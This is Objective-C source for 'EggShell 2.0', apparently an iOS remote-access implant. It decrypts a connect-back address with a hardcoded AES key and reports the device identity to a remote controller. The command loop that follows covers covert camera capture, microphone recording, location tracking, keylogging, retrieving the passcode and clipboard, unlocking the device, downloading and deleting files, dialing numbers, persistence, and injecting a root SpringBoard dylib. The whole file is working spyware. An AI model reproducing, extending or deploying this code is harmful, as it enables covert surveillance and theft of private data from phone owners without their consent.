//EggShell 2.0
//Created By lucas.py 8-18-16
//Last update 9-17-16
//Copyright 2016 Lucas Jackson

#include "espl.h"

NSFileManager *filemanager = [NSFileManager alloc];;
espl *_espl;

NSString *tmpData = @"";
NSArray *noReplyCommands = [[NSArray alloc] initWithObjects:
@"play", @"pause", @"next", @"prev", @"home", @"doublehome", @"lock", @"wake",@"keylogclear",@"togglemute",nil];
NSArray *yesReplyCommands = [[NSArray alloc] initWithObjects:
@"ismuted",@"getpasscode",@"getpaste",@"unlock",@"keylog",@"lastapp",@"islocked",nil];


int main(int argc, char **argv, char **envp) {
    _espl = [[espl alloc] init];
    /*this actually fucks up the alert command idk why
     [filemanager removeItemAtPath:[NSString stringWithFormat:@"%s",argv[0]] error:nil]; //delete self and cry
    */
    
    [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];

    //decrypt argument to connectback
    NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
    argument = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
    argument = [FBEncryptorAES decryptBase64String:argument keyString:@"spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"]; //shared decryption key
    NSArray *args = [argument componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    int success = [_espl connect:[NSString stringWithFormat:@"%@",args[0]] :atoi([args[1] UTF8String])];
    _espl.skey = args[2];
    _espl.terminator = args[3];
    
    if (success != -1) {
        NSString *name = [NSString stringWithFormat:@"%@ %@@%@",[[_espl thisUIDevice] identifierForVendor],NSUserName(),[[_espl thisUIDevice] name]];
        [_espl sendString:name];
        NSString *recvData;
        char buffer[2048];
        while (read(sockfd, &buffer, sizeof(buffer))) {
            recvData = [NSString stringWithFormat:@"%s",buffer];
            recvData = [recvData stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
            recvData = [FBEncryptorAES decryptBase64String:recvData keyString:_espl.skey];
            
            //ARGUMENTS of command
            NSArray *cmdarray = [recvData componentsSeparatedByCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
        
            if ([cmdarray[0] isEqualToString: @"exit"]) {
                exit(1);
            }
            else if ([cmdarray[0] isEqualToString: @"getpid"]) {
                [_espl getPid];
            }
            else if ([cmdarray[0] isEqualToString: @"vibrate"]) {
                [_espl vibrate];
            }
            else if ([cmdarray[0] isEqualToString: @"alert"]) {
                [_espl alert:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"ls"]) {
                [_espl directoryList:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"cd"]) {
                [_espl changeWD:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"rm"]) {
                [_espl rmFile:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"pwd"]) {
                [_espl sendString:filemanager.currentDirectoryPath];
            }
            else if ([cmdarray[0] isEqualToString: @"download"]) {
                [_espl download:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"setvol"]) {
                [_espl setVolume:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"getvol"]) {
                [_espl getVolume];
            }
            else if ([cmdarray[0] isEqualToString: @"isplaying"]) {
                [_espl isplaying];
            }
            else if ([cmdarray[0] isEqualToString: @"openurl"]) {
                [_espl openURL:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"dial"]) {
                [_espl dial:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"frontcam"]) {
                [_espl camera:true];
            }
            else if ([cmdarray[0] isEqualToString: @"backcam"]) {
                [_espl camera:false];
            }
            else if ([cmdarray[0] isEqualToString: @"mic"]) {
                [_espl mic:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"locate"]) {
                [_espl locate];
            }
            else if ([cmdarray[0] isEqualToString: @"respring"]) {
                [_espl exec:@"killall SpringBoard"];
                [_espl blank];
            }
            else if ([cmdarray[0] isEqualToString: @"battery"]) {
                [_espl sendString:[_espl battery]];
            }
            else if ([cmdarray[0] isEqualToString: @"listapps"]) {
                [_espl listapps];
            }
            else if ([cmdarray[0] isEqualToString: @"open"]) {
                [_espl launchApp:cmdarray];
            }
            else if ([cmdarray[0] isEqualToString: @"sysinfo"]) {
                [_espl sysinfo];
            }
            else if ([cmdarray[0] isEqualToString: @"say"]) {
                [_espl say:[recvData stringByReplacingOccurrencesOfString: @"say " withString:@""]]; //TODO: fix this idiot
            }
            else if ([cmdarray[0] isEqualToString: @"persistence"]) {
                [_espl persistence:[NSString stringWithFormat:@"%@",args[0]]:atoi([args[1] UTF8String])];
            }
            else if ([cmdarray[0] isEqualToString: @"rmpersistence"]) {
                [_espl rmpersistence];
            }
            else if ([cmdarray[0] isEqualToString: @"installpro"]) {
                if (getuid() == 0) {
                    [_espl sendString:@"1"];
                    [_espl upload:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
                    [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist;killall SpringBoard"];
                    [_espl blank];
                }
                else {
                    [_espl sendString:@"Requires Root"];
                }
            }
            //PRO Commands
            else if ([cmdarray[0] isEqualToString: @"locationservice"]) {
                [_espl locationService:cmdarray];
            }
            else if ([noReplyCommands containsObject:cmdarray[0]]) {
                [_espl mcSendNoReply:cmdarray[0]];
            }
            else if ([yesReplyCommands containsObject:cmdarray[0]]) {
                [_espl mcSendYesReply:cmdarray[0]];
            }
            else {
                [_espl sendString:@"-1"];
            }
            //clear the received data
            memset(buffer,'\0',2048);
        }
    }
    else {
        HBLogDebug(@"unsuccessfull connecting");
    }
	return 0;
}
